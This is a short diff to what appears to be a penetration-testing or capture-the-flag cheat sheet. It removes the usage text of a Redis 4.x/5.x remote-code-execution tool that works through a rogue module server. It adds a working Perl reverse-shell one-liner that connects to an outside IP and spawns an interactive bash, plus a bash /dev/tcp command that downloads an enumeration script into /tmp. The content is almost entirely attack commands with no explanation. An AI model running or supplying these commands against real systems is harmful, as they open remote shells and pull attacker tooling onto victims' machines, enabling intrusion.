@@ -1,21 +1,7 @@
 
 ```bash
-usage: redis-rce.py [-h] -r RHOST [-p RPORT] -L LHOST [-P LPORT] [-f FILE]
-                    [-a AUTH] [-v]
+perl -e 'use Socket;$i="10.10.14.123";$p=8001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
+# file transfer
+bash -c "cat < /dev/tcp/$IP/$PORT > /tmp/LinEnum.sh"
 
-Redis 4.x/5.x RCE with RedisModules
-
-optional arguments:
-  -h, --help            show this help message and exit
-  -r RHOST, --rhost RHOST
-                        target host
-  -p RPORT, --rport RPORT
-                        target redis port, default 6379
-  -L LHOST, --lhost LHOST
-                        rogue server ip
-  -P LPORT, --lport LPORT
-                        rogue server listen port, default 21000
-  -f FILE, --file FILE  RedisModules to load, default exp.so
-  -a AUTH, --auth AUTH  redis password
-  -v, --verbose         show more info
 ```
